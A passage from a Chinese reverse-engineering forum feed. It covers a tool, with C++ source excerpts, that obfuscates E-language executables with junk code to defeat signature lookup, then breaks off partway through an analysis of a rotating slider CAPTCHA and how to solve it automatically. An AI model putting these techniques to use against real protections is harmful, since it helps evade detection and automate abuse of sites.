class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>静态编译后自动处理，参考添加 <code style="font-family: SFMono-Regular, Consolas, ;">post_link_action1="$(E_TOOLS)\ELangPatcher.exe" $(TARGET)</code>；</p></li><li style="margin-left: 2px;"><p>如果有自动加壳，你需要调整序号，让 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 先执行；</p></li></ol></ol><h2>部分代码展示</h2><p>混淆 cld/fninit 特征 (<code style="font-family: SFMono-Regular, Consolas, ;">LibELangPatch/ELangInitFnGen.cpp</code>)：</p><p>本质上就是抽取 <code style="font-family: SFMono-Regular, Consolas, ;">cld; fninit; call xxxx</code> 这串代码到别的地方，并插入随机垃圾代码避免现有特征码定位：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/**<br /> * 0040116D | FC          | cld             &lt;-- addr start<br /> * 0040116E | DBE3        | fninit<br /> * 00401170 | E8 ECFFFFFF | call exe.401161 &lt;-- call_delta = 0x0xFFFFFFEC<br /> * @param call_delta This can be `{}` if the call is empty.<br /> * @return<br /> */</span><br />std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">GenerateELangLoaderInit</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta);<br /><br /><span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ELangLoaderInitGen</span> : <span style="color: rgb(150, 203, 254);">public</span> CodeGenHelper {<br /><span style="color: rgb(150, 203, 254);">public</span>:<br />    <span style="color: rgb(150, 203, 254);">explicit</span> <span style="color: rgb(255, 255, 182);">ELangLoaderInitGen</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta) {<br />        <span style="color: rgb(150, 203, 254);">auto</span> regs = shuffled&lt;Reg32&gt;({eax, edx, ecx});<br />        fillWithJunkSlideInst(rand_int(<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">5</span>), regs);<br />        shuffle_exec({<br />                [&amp;]() { cld(); genJunk(regs); },<br />                [&amp;]() { fninit(); genJunk(regs); },<br />        });<br />        fillWithJunkSlideInst(rand_int(<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">5</span>), regs);<br /><br />        <span style="color: rgb(255, 255, 182);">bool</span> use_ret_trick{<span style="color: rgb(198, 197, 254);">false</span>};<br />        <span style="color: rgb(150, 203, 254);">if</span> (call_delta) {<br />            use_ret_trick = next_bool();<br />            <span style="color: rgb(150, 203, 254);">auto</span> reg_ret_addr = pop_last_item(regs);<br />            mov(reg_ret_addr, dword[esp]);<br />            genJunk(regs);<br />            <span style="color: rgb(150, 203, 254);">if</span> (use_ret_trick) {<br />                add(dword[esp], <span style="color: rgb(255, 115, 253);">3</span>);<br />                genJunk(regs);<br />            }<br />            <span style="color: rgb(150, 203, 254);">auto</span> delta_signed = static_cast&lt;<span style="color: rgb(255, 255, 182);">int32_t</span>&gt;(*call_delta);<br />            <span style="color: rgb(150, 203, 254);">if</span> (delta_signed &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />                add(reg_ret_addr, delta_signed);<br />            } <span style="color: rgb(150, 203, 254);">else</span> {<br />                sub(reg_ret_addr, -delta_signed);<br />            }<br />            genJunk(regs);<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (use_ret_trick) {<br />                jmp(reg_ret_addr);<br />            } <span style="color: rgb(150, 203, 254);">else</span> {<br />                call(reg_ret_addr);<br />            }<br />        }<br /><br />        regs = shuffled&lt;Reg32&gt;({eax, edx, ecx});<br />        <span style="color: rgb(150, 203, 254);">if</span> (!use_ret_trick) {<br />            genJunk(regs);<br />            add(dword[esp], <span style="color: rgb(255, 115, 253);">3</span>);<br />        }<br />        genJunk(regs);<br />        ret();<br /><br />        std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">junk</span>(rand_int(<span style="color: rgb(255, 115, 253);">4</span>, <span style="color: rgb(255, 115, 253);">10</span>));<br />        std::generate(junk.begin(), junk.end(), mt_);<br />        db(junk.data(), junk.size());<br />    }<br />};<br /><br />std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">GenerateELangLoaderInit</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta) {<br />    <span style="color: rgb(150, 203, 254);">return</span> ELangLoaderInitGen{call_delta}.vec();<br />}</code></pre><p>扩充 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 段，若无剩余空间则建立新的 <code style="font-family: SFMono-Regular, Consolas, ;">.txt2</code> 段储存代码 (<code style="font-family: SFMono-Regular, Consolas, ;">src/PEParser.h</code>)：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">            inline uint8_t *<span style="color: rgb(255, 255, 182);">ExpandTextSection</span>(uint32_t size) {<br />                auto p_nt_header = <span style="color: rgb(255, 255, 182);">INNER_PIMAGE_NT_HEADERS</span>((uint8_t *) (exe_data_.<span style="color: rgb(255, 255, 182);">data</span>()) + <span style="color: rgb(255, 255, 182);">PIMAGE_DOS_HEADER</span>(exe_data_.<span style="color: rgb(255, 255, 182);">data</span>())-&gt;e_lfanew);<br />                auto p_file_header = &amp;p_nt_header-&gt;FileHeader;<br />                auto section_count = std::<span style="color: rgb(255, 255, 182);">size_t</span>(p_file_header-&gt;NumberOfSections);<br /><br />                auto section = (PIMAGE_SECTION_HEADER) ((uint8_t *) (p_nt_header) + <span style="color: rgb(255, 255, 182);">offsetof</span>(INNER_IMAGE_NT_HEADERS, OptionalHeader) + p_nt_header-&gt;FileHeader.SizeOfOptionalHeader);<br /><br />                auto &amp;image_size = <span style="color: rgb(255, 255, 182);">GetNtOptionalHeader</span>()-&gt;SizeOfImage;<br /><br />                <span style="color: rgb(255, 255, 182);">for</span> (std::size_t i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; section_count; i++) {<br />                    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>((<span style="color: rgb(255, 255, 182);">char</span> *) section-&gt;Name, <span style="color: rgb(168, 255, 96);">".text"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                        <span style="color: rgb(255, 255, 182);">if</span> (section-&gt;Misc.VirtualSize + size &lt; section-&gt;SizeOfRawData) {<br />                            auto offset = section-&gt;Misc.VirtualSize;<br />                            section-&gt;Misc.VirtualSize += size;<br />                            <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(section-&gt;PointerToRawData + offset);<br />                        }<br />                    } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>((<span style="color: rgb(255, 255, 182);">char</span> *) section-&gt;Name, <span style="color: rgb(168, 255, 96);">".txt2"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                        exe_data_.<span style="color: rgb(255, 255, 182);">resize</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() + size);<br />                        auto offset = section-&gt;SizeOfRawData;<br />                        section-&gt;SizeOfRawData += size;<br />                        image_size -= section-&gt;Misc.VirtualSize;<br />                        section-&gt;Misc.VirtualSize = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(section-&gt;SizeOfRawData);<br />                        image_size += section-&gt;Misc.VirtualSize;<br />                        <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(section-&gt;PointerToRawData + offset);<br />                    }<br />                    section++;<br />                }<br /><br />                auto last_section = §ion[-<span style="color: rgb(255, 115, 253);">1</span>];<br />                p_file_header-&gt;NumberOfSections++;<br /><br />                <span style="color: rgb(255, 255, 182);">memset</span>(section, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 255, 182);">sizeof</span>(*section));<br />                <span style="color: rgb(255, 255, 182);">memcpy</span>(section-&gt;Name, <span style="color: rgb(168, 255, 96);">".txt2"</span>, <span style="color: rgb(255, 115, 253);">6</span>);<br />                section-&gt;PointerToRawData = exe_data_.<span style="color: rgb(255, 255, 182);">size</span>();<br />                section-&gt;SizeOfRawData = size;<br />                section-&gt;Misc.VirtualSize = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(size);<br />                image_size = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(image_size) + section-&gt;Misc.VirtualSize;<br />                section-&gt;VirtualAddress = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(last_section-&gt;VirtualAddress + last_section-&gt;Misc.VirtualSize);<br />                section-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;<br />                exe_data_.<span style="color: rgb(255, 255, 182);">resize</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() + size);<br /><br />                <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() - size);<br />            }</code></pre><hr /><h2>下载</h2><ul><li style="margin-left: 2px;"><p>程序： </p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7bf08160&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW96FTJVfEQytoddBVaVbzrl23kGlcyy31b7ibrC84S1aChQuZ3PNLOt1A%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="vertical-align: middle; cursor: pointer; border-width: 0px; border-color: initial; width: auto;" /> <span>ELangPatcher-0.1.1.zip 见左下角论坛原文</span></li><li style="margin-left: 2px;"><p>源码：https://github.com/FlyingRainyCats/ELangPatcher | </p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7bf08160&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW96FTJVfEQytoddBVaVbzrl23kGlcyy31b7ibrC84S1aChQuZ3PNLOt1A%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="vertical-align: middle; cursor: pointer; border-width: 0px; border-color: initial; width: auto;" /> <span>ELangPatcher-0.1.1-src.zip <span>见左下角论坛原文</span></span></li><li style="margin-left: 2px;"><p>百度网盘存档/测试程序 https://pan.baidu.com/s/1Jlbqt8K1fIG6PPbfrrEI_A?pwd=q565</p></li></ul><h3>更新记录</h3><ul><li style="margin-left: 2px;"><p>v0.1.1: 修正 <code style="font-family: SFMono-Regular, Consolas, ;">GenerateVArgsProxyCode</code> 的代码生成（如 <code style="font-family: SFMono-Regular, Consolas, ;">取余数</code> 传参），感谢 <code style="font-family: SFMono-Regular, Consolas, ;">谁的坏叔叔</code> 报告。</p></li><li style="margin-left: 2px;"><p>v0.1: 初版发布</p></li></ul><h2>结语</h2><p>代码写得比较乱，大概率不会有后续更新了…</p><p>拿 <code style="font-family: SFMono-Regular, Consolas, ;">Xbyak</code> 生成字节码，调试错误的时候也是磕磕碰碰。因为都是手动插入的垃圾指令，早期写得那些代码生成的混淆“相对温和”。后期整得有点走火入魔，也尝试了下隐藏常数。</p><p>一开始就想着对抗下 “一键 PUSH”，这个目的倒是达到了。不过其它的特征… 手动根本就处理不完。</p><p>在 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 外的内容如果有匹配上特征码也会尝试进行魔改。读者有兴趣可以限制特征码检索为 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 区段的代码。</p><p>不过，这些混淆/膨胀的手段在 IDA 的帮助下分析起来倒是不怎么费劲就是…</p><h3>碎碎念</h3><ul><li style="margin-left: 2px;"><p>易语言的编译顺序太“稳定”了，可以通过定位目标函数附近的函数来快速定位。</p></li><li style="margin-left: 2px;"><p>没处理过特征的函数依然可以手动检索特征码找到。</p></li><li style="margin-left: 2px;"><p>再做下去感觉需要自动化识别函数、反编译、然后随机混淆/膨胀了。</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>要考虑的东西太多了，不适合我。</p></li></ul></ul><h2>致谢</h2><ul><li style="margin-left: 2px;"><p>fjqisba 老师的易语言逆向专栏</p></li><li style="margin-left: 2px;"><p>易语言程序分析笔记 - 看雪/PlaneJun</p></li></ul><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904733-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 28 Mar 2024 14:42:44 +0800</pubDate>
</item>
<item>
<title>[验证码识别]某盾滑块验证码增强版的识别</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140373&amp;idx=1&amp;sn=83e93cad7c5a97819f3ba2cf98f4ea03&amp;chksm=bd50a1418a2728571c78c36f8f36dbf500fb45939cfaa1e1c9c5e7b22d8fb8556abe3f5ed890&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140373&amp;idx=1&amp;sn=83e93cad7c5a97819f3ba2cf98f4ea03&amp;chksm=bd50a1418a2728571c78c36f8f36dbf500fb45939cfaa1e1c9c5e7b22d8fb8556abe3f5ed890&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> - 最近，某盾推出了增强版验证码，其中滑块移动轨迹是条弧线，且会旋转，通过attrs值控制移动和旋转方式。<br />
- 滑块移动轨迹通过控制台调试可以观察到，attrs值影响滑块移动和旋转，如attrs小于0时以右上角为中心点进行旋转。<br />
- 滑块移动轨迹算法通过代码分析得到，可以计算滑块的偏移量和旋转角度。<br />
- 实现缺口识别的方案包括旋转模板匹配、目标检测+旋转模板匹配、目标检测+滑块轨迹位置匹配和置信度比较。<br />
- 通过计算滑块轨迹点和缺口中心点的最小距离，可以匹配正确的缺口，选择置信度最高的缺口作为目标。<br />
- 进行目标检测需要训练数据集并合理选择训练数量，训练方法可以参考作者之前的文章。<br />
- 欢迎讨论和分享更好的识别方法。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-27 16:38</span> <span style="display: inline-block;">北京</span>
</p>

<p>本文章所有内容仅供学习和研究使用，本人不提供具体模型和源码。若有侵权，请联系我立即删除！维护网络安全，人人有责。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=a053cefe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCZfAJBBxfTToc6iaPupjmEgPia0RE75sVSVAjiaicCQaBZgDeiamHQttrVGw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>s1lencee</strong></p><p style="line-height: normal; margin-bottom: 0px;"><span></span><br /></p><blockquote><h4 style="margin-bottom: 16px; font-size: 1em; font-weight: 600; line-height: 1.25;">本文章所有内容仅供学习和研究使用，本人不提供具体模型和源码。若有侵权，请联系我立即删除！维护网络安全，人人有责。</h4></blockquote><hr /><h2>前言</h2><p>最近，某盾新推出了增强版验证码，其中滑块的增强版比较新颖（或许是我见识少，我见过百度类似的，但不是滑块）。</p><p><img border="0" height="326" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2aa25fa7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCCShWNAJAMI65vsibdLCqccsHAxF4Hlkcz2rlQdX2ic1pGP3Yaon4OEGw%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="482" /></p><p><br /></p><p>与传统滑块不同的是，该滑块的移动轨迹是条弧线，且还会旋转，并且两个缺口的形状相同，这就排除了传统的cv2模板匹配识别缺口的方式。</p><h2>目录</h2><ul><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">滑块移动曲线研究</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">还原滑块移动曲线</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">缺口识别的方案</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">匹配缺口</h3></li></ul><h2>滑块移动曲线研究</h2><p>和非增强版滑块不同的是，该滑块接口新返回了一个值<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>，并且每次返回的值都不同</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">{<br />    "attrs": [<span style="color: rgb(255, 115, 253);">0.20475486292799452</span>],<br />    ...<br />}</code></pre><p>而且每次滑块旋转角度和偏移位置都不同，因此有理由怀疑滑块的移动轨迹和该值有关。</p><p>我们现在开始分析滑块是怎么移动和旋转的，通过控制台给滑块图片的CSS加上边框显示，就可以明显看出滑块的移动。</p><p style="text-align: left;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f5e6dd89&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCYrA4vhLSicsEhQuEPBFcjial3eU8GMkJp96vNxrzwRwwY1aALNc22zeA%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" /></p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1457cb40&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCX1SOyAA3DIbafic8mI9VFhZVAOuxxeByHicggp3XUaY5xGHffmLWDmXw%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="462" /></p><p><br /></p><p>结合<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>可以发现当<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>小于0时，是以滑块图片的右上角为中心点进行旋转加向右偏移，反之则以右下角为中心点。</p><p>为了验证我们的猜想，我们可以查看它的js文件，以下是我经过反混淆后的代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">updateJigsawRotateAndLeft</span>() {<br />    <span style="color: rgb(150, 203, 254);">var</span> E = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$el'</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , w = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"$slider"</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , Q = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"$jigsaw"</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , J = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"restrict"</span>](<span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>], w - Q);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'ratio'</span>] = (E / <span style="color: rgb(255, 115, 253);">0x2</span> - Q) / E,<br />        <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"attrs"</span>]) {<br />        <span style="color: rgb(150, 203, 254);">var</span> g0 = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'attrs'</span>][<span style="color: rgb(255, 115, 253);">0x0</span>]<br />            , g1 = J * <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'ratio'</span>];<br />        <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'left'</span>] = g1 + <span style="color: rgb(168, 255, 96);">'px'</span>,<br />            <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'transform'</span>] = <span style="color: rgb(168, 255, 96);">'rotate('</span> + g0 * g1 + <span style="color: rgb(168, 255, 96);">'deg)'</span>,<br />            <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'transformOrigin'</span>] = g0 &gt; <span style="color: rgb(255, 115, 253);">0x0</span> ? <span style="color: rgb(168, 255, 96);">"bottom right"</span> : <span style="color: rgb(168, 255, 96);">"top right"</span>;<br />    }<br />}</code></pre><p>可以看到当g0也就是<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>大于0时，将滑块dom的style（也就是css）的<code style="font-family: SFMono-Regular, Consolas, ;">transformOrigin</code>设置为<code style="font-family: SFMono-Regular, Consolas, ;">bottom right</code>，并且还可以得知滑块旋转角度<code style="font-family: SFMono-Regular, Consolas, ;">rotate</code>由滑块偏移距离g1与<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>的值g0相乘得到</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4515d4f5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCCSB8OAWldr0Fsc7PDIAxJmuyypicGR8q3Q6yOd36AbfVzyaFQdNHwQA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="998" /></p><p><br /></p><p>查资料得知，<code style="font-family: SFMono-Regular, Consolas, ;">transformOrigin: bottom right</code>正是设置中心点为右下角</p><h2>还原滑块移动曲线</h2><p>再次观察可以发现，滑块的偏移量和下面滑条的偏移量是不相同的，研究上面的js可以发现，滑块的偏移量经过一些算法得到J，再计算就可以得到滑块的偏移量</p><p>在控制台上打上日志点，再和还原的算法结果对比</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1144d70d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCEqYjnbcDs8ZY5Q34vqqMncibJmQGSyiaibV6hwwf2pNoBwXcxbXstibElA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以看到，结果一样。</p><h2>缺口识别的方案</h2><p>我们的目标是获取每个缺口的位置和旋转的角度，才可以判断哪个是符合条件的缺口，例如我得到一个缺口的角度，可以反向计算出滑块的偏移量，然后和该缺口的位置匹配，那么该缺口就是目标。</p><h3>1.旋转模板匹配</h3><p>我刚开始采用了旋转模板匹配，也就是将滑块旋转，然后每次旋转都进行一次模板匹配，返回置信度最高的坐标和角度。</p><p>但是由于多个缺口的存在，即使取置信度最高的2个值，也不能保证能匹配成功，有时候甚至不能匹配到缺口</p><p>于是我弃用了这个方法</p><h3>2.目标检测 + 旋转模板匹配</h3><p>在某大佬的建议下，我使用yolov5先将滑块缺口切割出来，再对切割下来的图片进行旋转模板匹配</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bfd9e235&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCPibfJZev0r3cfHR8EloQiaicGicwhVRQa8s1Dc1PCwOQsceUbUUnVAWJjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="640" /></p><p><br 